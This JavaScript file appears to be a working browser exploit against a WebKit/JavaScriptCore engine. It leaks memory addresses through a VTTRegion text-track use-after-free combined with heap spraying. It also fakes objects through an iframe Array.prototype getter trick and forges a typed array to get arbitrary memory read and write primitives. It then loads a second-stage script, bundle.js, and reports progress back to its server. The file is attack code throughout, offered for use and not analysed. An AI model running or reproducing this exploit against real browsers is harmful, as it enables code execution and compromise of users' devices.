/* eslint no-redeclare: "off" */
/* eslint no-unmodified-loop-condition: "off" */
/* global XMLHttpRequest, alert, ImageData, postMessage, history */
function send (ep, data) {
	var msg = {
		msg: data
	};
	var jsonstr = JSON.stringify(msg);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send(jsonstr);
	} catch (e) {

	}
}

function log (msg) {
	send('log', msg === undefined ? 'undefined' : msg.toString());
}

window.onerror = function (msg, url, line) {
	if (msg === 'Out of memory') { alert(msg); }
	send('error', [line, msg]);
	//  location.reload();
};

function buildObject (lo, hi, cb) {
	log('Building stuff.');
	var a = [0, 4.243991582e-314, u2d(lo, hi), 3.5e-323, 3.5e-323];
	var f = document.body.appendChild(document.createElement('iframe'));
	f.contentWindow.Array.prototype.__defineGetter__(100, () => 1);
	var sub = f.contentWindow.Array.prototype.slice.call(a, 0, 4);
	f.remove();
	cb(sub[0]);
}

function leakAddrs(obja, objb, objc, cb) {
	var validator = ~~(Math.random() * 0x10000);
	var vj = u2d(validator, 0);

	var vr = new VTTRegion();
	var v = document.createElement("video");
	v.appendChild(document.createElement("track"));
	v.textTracks[0].addRegion(vr);
	v = null;

	function agc()
	{
		var sprayCount = 0x10000;
		var ar = [];
		for(var i = 0; i < sprayCount; ++i)
			ar[i] = [obja,objb,objc,vj,{},{},{},{},{},{},{}];
		var v = document.createElement("video");
		if(vr.track.kind.length > 16){
			var tbuf = new Uint16Array(512);
			var cbuf = new Uint32Array(tbuf.buffer);
			for(var i = 0; i < 512; ++i)
				tbuf[i] = vr.track.kind.codePointAt(i);

			for(var i = 6; i < 512; ++i) {
				if(tbuf[i << 1] == validator) {
					i -= 6;
					log('Found addresses!');
					for(var j = 0; j < 6; ++j)
						log(cbuf[i + j].toString(16));
					var a = [cbuf[i + 0], cbuf[i + 1]];
					var b = [cbuf[i + 2], cbuf[i + 3]];
					var c = [cbuf[i + 4], cbuf[i + 5]];

					for(var i = 0; i < sprayCount; ++i)
						delete ar[i];
					ar = null;
					return cb(a, b, c, vr);
				}
			}
		}
		log("Failed to find addresses");
		failed();
	}

	setTimeout(agc, 0);
}

function failed() {
	while(true)
		alert('Failed. Hit the home button and try again.');
}

var _dview;
function u2d (low, hi) {
	if (!_dview) _dview = new DataView(new ArrayBuffer(8));
	_dview.setUint32(0, low, true);
	_dview.setUint32(4, hi, true);
	return _dview.getFloat64(0, true);
}

window.minmain = function minmain () {
	log('Starting.');
	buildObject(0, 0, function (b) {
		buildObject(0x1337, 0x1, function (d) {
			var sid = 1;
			var magic = {
				'a': u2d(sid, 0x1602300 - 0x10000),
				'b': b,
				'c': u2d(1, 2),
				'd': d
			};
			d = 0;
			b = 0;

			var bstore = new ArrayBuffer(0x10 * 4);
			var rwmagic = new Uint32Array(bstore);
			var leakee = {'b': null};
			var leaker = {'a': leakee};
			leakAddrs(magic, rwmagic, leaker, function (magicaddr, rwaddr, leakeraddr, vr) {
				buildObject(rwaddr[0], rwaddr[1], function (c) {
					magic.c = c;
					c = 0;
					buildObject(magicaddr[0] + 4 * 4, magicaddr[1], function (o) {
						log('Inside o...');
						while (sid < 0x10000 && !(o instanceof Uint32Array)) { magic.a = u2d(++sid, 0x1602300 - 0x10000); }
						if (!(o instanceof Uint32Array)) {
							log('Could not find structure ID.  Wtf?');
							return;
						}
						log('Success?');
						var save = [o[4], o[5], o[6]];

						o[4] = leakeraddr[0];
						o[5] = leakeraddr[1];
						o[6] = 0x1337;

						var va = new Uint32Array(bstore);
						var vb = new Uint32Array(bstore);
						leaker['a'] = leakee;
						leakee['b'] = {'a': va};
						var leakaddr = [rwmagic[4], rwmagic[5]];

						o[4] = leakaddr[0];
						o[5] = leakaddr[1];
						var ta = [rwmagic[4], rwmagic[5]];
						o[4] = ta[0];
						o[5] = ta[1];
						var addra = [rwmagic[4], rwmagic[5]];

						o[4] = leakaddr[0];
						o[5] = leakaddr[1];
						leakee['b'] = {'a': vb};
						ta = [rwmagic[4], rwmagic[5]];
						o[4] = ta[0];
						o[5] = ta[1];
						var addrb = [rwmagic[4], rwmagic[5]];

						o[4] = addra[0];
						o[5] = addra[1];
						rwmagic[4] = addrb[0];
						rwmagic[5] = addrb[1];

						o[4] = save[0];
						o[5] = save[1];
						o[6] = save[2];
						rwmagic = 0;
						magic.a = 0;
						magic.b = 0;
						magic.c = 0;
						magic.d = 0;
						o = 0;

						log('Cleaning up');

						function read4(addr, offset) {
							if (arguments.length === 1) { offset = 0; }

							va[4] = addr[0];
							va[5] = addr[1];
							va[6] = 1 + offset;
							return vb[offset];
						}
						function write4(val, addr, offset) {
							if (arguments.length === 2) { offset = 0; }

							va[4] = addr[0];
							va[5] = addr[1];
							va[6] = 1 + offset;

							vb[offset] = val;
						}
						function read8(addr, offset) {
							if (arguments.length === 1) { offset = 0; }
							return [read4(addr, offset), read4(addr, offset + 1)];
						}
						function write8(val, addr, offset) {
							if (arguments.length === 2) { offset = 0; }
							if (typeof (val) === 'number') { val = [val, 0]; }
							write4(val[0], addr, offset);
							write4(val[1], addr, offset + 1);
						}
						function getAddr(obj) {
							leakee['b'] = {'a': obj};
							return read8(read8(leakaddr, 4), 4);
						}

						var v = document.createElement("video");
						v.appendChild(document.createElement("track"));
						var nta = read8(getAddr(v.textTracks[0]), 0x18 >> 2);
						write8(nta, getAddr(vr.track), 0x18 >> 2);
						leakee['b'] = {'a': null};

						log('Loading and running main');

						loadRun({
							bstore: bstore,
							va: va,
							vb: vb,
							leakee: leakee,
							leakaddr: leakaddr, 

							v: v, 
							vr: vr
						});
					});
				});
			});
		});
	});
};

function loadRun (obj) {
	window.exploitMe = obj;
	var elem = document.createElement('script');
	elem.setAttribute('src', 'bundle.js');
	document.body.appendChild(elem);
}

setTimeout(function () {
	document.getElementById('test').click();
}, 100);
